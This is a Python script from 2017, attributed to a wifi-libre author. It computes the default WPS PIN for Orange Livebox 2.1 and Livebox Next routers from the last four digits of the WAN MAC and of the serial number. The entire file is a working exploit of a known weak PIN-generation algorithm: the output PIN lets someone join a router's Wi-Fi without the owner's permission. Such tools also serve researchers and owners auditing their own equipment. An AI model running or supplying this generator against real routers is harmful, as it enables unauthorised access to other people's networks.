#!/usr/bin/python
# orangen.py: simplified default pin generator for livebox 2.1 and livebox next
# usage: python orangen.py <4 last digits from wan mac> <4 last digits from serial>
# It will just return the PIN  
# Algorithm and vulnerability by wifi-libre. For more details check https://www.wifi-libre.com/topic-869-todo-sobre-al-algoritmo-wps-livebox-arcadyan-orange-xxxx.html
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License along with this program; if not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA
# Contact script author: kcdtv@wifi-libre.com
# Copyleft (C) 2017 kcdtv @ www.wifi-libre.com
import sys
def wps_checksum(x):
	accum = 0
	t = x
	while (t):
		accum += 3 * (t % 10)
		t /= 10
		accum += t % 10
		t /= 10
	return (10 - accum % 10) % 10
mac = sys.argv[1]
seri = sys.argv[2]
s1  = int(seri[0], 16)
s2  = int(seri[1], 16)
s3  = int(seri[2], 16)
s4  = int(seri[3], 16)
m1  = int(mac[0], 16)
m2  = int(mac[1], 16)
m3  = int(mac[2], 16)
m4  = int(mac[3], 16)
k1  = ( s1 + s2 + m3 + m4 ) & 0xf
k2  = ( s3 + s4 + m1 + m2 ) & 0xf
d1  = k1 ^ s4 
d2  = k1 ^ s3
d3  = k2 ^ m2
d4  = k2 ^ m3
d5  = s4 ^ m3
d6  = s3 ^ m4
d7  = k1 ^ s2 
pin = int("0x%1x%1x%1x%1x%1x%1x%1x"%(d1, d2, d3, d4, d5, d6, d7), 16) % 10000000
pin = "%.7d%d" %(pin, wps_checksum(pin))
print pin
